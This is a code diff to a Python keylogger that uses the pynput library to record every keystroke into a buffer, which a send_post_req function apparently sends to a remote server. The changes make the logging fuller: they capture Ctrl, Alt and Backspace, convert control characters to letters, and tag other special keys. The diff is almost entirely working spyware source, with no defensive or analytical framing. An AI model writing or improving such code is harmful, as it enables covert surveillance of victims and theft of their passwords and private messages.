@@ -18,7 +18,6 @@ def send_post_req():
     except:
         print("Couldn't complete request!")
 
-# We only need to log the key once it is released. That way it takes the modifier keys into consideration.
 def on_press(key):
     global text
 
@@ -28,22 +27,28 @@ def on_press(key):
         text += "\t"
     elif key == keyboard.Key.space:
         text += " "
-    elif key == keyboard.Key.shift:
+    elif key in (keyboard.Key.shift, keyboard.Key.shift_r):
         pass
-    elif key == keyboard.Key.backspace and len(text) == 0:
-        pass
-    elif key == keyboard.Key.backspace and len(text) > 0:
-        text = text[:-1]
-    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
-        pass
+    elif key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
+        text += "[CTRL]+"
+    elif key == keyboard.Key.alt or key == keyboard.Key.alt_l or key == keyboard.Key.alt_gr:
+        text += "[ALT]+"
+    elif key == keyboard.Key.backspace:
+        text += "[BASKSPACE]"
     elif key == keyboard.Key.esc:
         return False
     else:
-        # We do an explicit conversion from the key object to a string and then append that to the string held in memory.
-        text += str(key).strip("'")
-
+        if hasattr(key, 'char') and key.char is not None:
+            if 1 <= ord(key.char) <= 26:
+                letra = chr(ord(key.char) + 96)
+                text += letra
+            else:
+                text += key.char
+        else:
+            text += f"[{str(key).replace('Key.', '')}]"
 
 with keyboard.Listener(
     on_press=on_press) as listener:
     send_post_req()
     listener.join()
+
